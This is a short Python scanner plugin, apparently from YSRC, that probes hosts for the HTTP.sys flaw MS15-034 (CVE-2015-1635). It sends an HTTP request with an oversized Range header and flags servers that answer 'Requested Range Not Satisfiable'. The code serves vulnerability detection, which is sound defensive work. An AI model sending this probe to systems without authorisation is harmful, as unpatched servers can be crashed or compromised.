import socket


recommend_port = [
    '80',
    '443'
]


def plugin_info():
    plugin_info = {
        "name": "MS15-034 HTTP.sys 远程代码执行（CVE-2015-1635）",
        "author": "wolf@YSRC",
        "level": "High",
        "type": "Remote execute",
        "url": "",
    }
    return plugin_info


def run(ip_list, port_list, timeout=5):
    for ip in ip_list:
        for port in port_list:
            try:
                socket.setdefaulttimeout(timeout=timeout)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, int(port)))
                flag = b"GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
                sock.send(flag)
                data = sock.recv(1024)
                sock.close()
                if 'Requested Range Not Satisfiable' in data and 'Server: Microsoft' in data:
                    return u"存在HTTP.sys远程代码执行漏洞"
            except Exception as e:
                print(e)
                pass